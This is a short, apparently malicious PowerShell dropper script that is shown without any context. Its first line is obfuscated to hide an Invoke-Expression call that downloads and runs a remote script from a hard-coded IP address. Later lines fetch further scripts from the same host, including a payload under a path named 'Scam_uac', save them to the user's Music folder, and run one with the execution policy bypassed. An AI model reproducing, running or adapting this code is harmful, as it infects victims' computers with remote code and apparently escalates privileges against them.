

&('{0}{1}'-f 'IE','X') ((&('{3}{2}{0}{1}' -f '-Obje','ct','w','Ne') ('{0}{1}{3}{2}' -f 'N','et.W','t','ebClien')).('{1}{3}{2}{0}'-f'String','Do','d','wnloa').Invoke('http://44.203.122.41:80/mini.ps1'));
$down = New-Object System.Net.WebClient
$url  = 'http://44.203.122.41:80/Scam_uac/Uac_main.ps1'
$file = "c:\Users\$env:USERNAME\Music\Uac_main.ps1"
$down.DownloadFile($url, $file);

$down = New-Object System.Net.WebClient
$url  = 'http://44.203.122.41:80/Scam_uac/payloads/2yix9xt1.ps1'
$file = "c:\Users\$env:USERNAME\Music\2yix9xt1.ps1"
$down.DownloadFile($url, $file);

powershell -ExecutionPolicy Bypass c:\Users\$env:USERNAME\Music\Uac_main.ps1
    